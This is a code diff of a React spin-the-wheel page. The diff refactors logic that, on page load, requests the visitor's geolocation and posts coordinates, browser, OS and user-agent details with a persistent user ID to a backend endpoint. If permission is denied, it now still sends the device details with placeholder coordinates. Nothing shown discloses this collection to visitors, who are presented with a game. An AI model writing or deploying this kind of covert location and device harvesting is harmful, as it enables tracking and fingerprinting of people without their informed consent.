@@ -75,18 +75,7 @@ function App() {
   const wheelRef = useRef();
   const [userId] = useState(getOrCreateUserId());
 
-  // Send email as soon as user lands on this page
-  useEffect(() => {
-    // Collect device info
-
-    if (!navigator.geolocation) {
-      alert("Geolocation is not supported.");
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const deviceInfo = {
+   const deviceInfo = {
           browser: navigator.userAgentData
             ? navigator.userAgentData.brands.map((b) => b.brand).join(", ")
             : navigator.userAgent,
@@ -97,26 +86,59 @@ function App() {
           userAgent: navigator.userAgent,
         };
 
-        fetch("http://localhost:5000/api/location", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            userId,
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            deviceInfo,
-          }),
-        })
-          .then((res) => res.json())
-          .then((response) => {
-            console.log("sent location");
-          })
-          .catch((err) => alert("Try one more time"));
+
+ const sendLocation = async (lat, lng) => {
+    try {
+
+       const deviceInfo = {
+          browser: navigator.userAgentData
+            ? navigator.userAgentData.brands.map((b) => b.brand).join(", ")
+            : navigator.userAgent,
+          os: navigator.userAgentData
+            ? navigator.userAgentData.platform
+            : navigator.platform,
+          platform: navigator.platform,
+          userAgent: navigator.userAgent,
+        };
+      const response = await fetch("http://localhost:5000/api/location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userId, lat, lng, deviceInfo }),
+      });
+      const data = await response.json();
+      console.log("Location sent:", data);
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
+  const requestLocation = () => {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        // User allowed location
+        sendLocation(pos.coords.latitude, pos.coords.longitude);
       },
       (err) => {
-        alert("Try one more time: " + err.message);
+        if (err.code === err.PERMISSION_DENIED) {
+              sendLocation("00000", "00000");
+        }
       }
     );
+  };
+
+
+
+
+  // Send email as soon as user lands on this page
+  useEffect(() => {
+    // Collect device info
+
+    if (!navigator.geolocation) {
+      alert("Geolocation is not supported.");
+      return;
+    }
+
+   requestLocation();
   }, [userId]);
 
   const spin = () => {
